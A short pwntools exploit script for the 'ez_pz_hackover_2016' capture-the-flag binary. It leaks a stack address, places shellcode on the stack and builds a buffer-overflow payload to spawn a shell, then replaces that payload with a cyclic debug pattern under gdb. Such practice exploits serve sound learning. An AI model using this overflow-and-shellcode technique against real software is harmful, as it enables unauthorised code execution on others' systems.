from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
sh = process("./ez_pz_hackover_2016")
# sh = remote("node3.buuoj.cn",26453)
elf = process("./ez_pz_hackover_2016")
sh.recvuntil("crash: 0x")
stack_addr = int(sh.recv(8),16) 
log.info("success get stack_addr:0x%x"%stack_addr)
shell_addr = stack_addr - 0x1c
shellcode = asm(shellcraft.sh())
payload = "crashme" + '\x00' + 'a' * 0x12 + p32(shell_addr) + shellcode 
payload = "crashme" + '\x00' + "aaaabaaacaaadaaaea" + 'aaaa' + 'bbbb'
gdb.attach(sh)
pause()
sh.sendline(payload)
sh.interactive()